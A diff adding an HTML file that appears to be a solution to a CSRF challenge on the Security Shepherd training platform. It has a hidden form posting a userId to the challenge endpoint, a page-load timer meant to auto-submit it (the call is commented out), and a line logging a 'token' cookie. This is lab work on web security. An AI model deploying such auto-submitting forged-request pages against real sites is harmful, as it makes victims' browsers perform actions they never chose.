@@ -1,0 +1,23 @@
+<form name="myForm" id="myForm" action="https://security-shepherd-app.eng.qops.net/user/csrfchallengetwo/plusplus" method="POST">
+    <p>
+		<input type="hidden" name="userId" value="394682267744559fe293869075243bbefb22506f" />
+    </p>
+    <p>
+        <input style="display: none;" type="submit" value="Submit" />
+    </p>
+</form>
+
+<script type="text/javascript">
+    window.onload=function(){
+        var auto = setTimeout(function(){ autoRefresh(); }, 100);
+
+        function submitform(){
+			console.log('submitting');
+          document.forms["myForm"].submit();
+        }
+		function autoRefresh(){
+			//submitform();
+		}
+    }
+    console.log(getCookie('token'));
+</script>
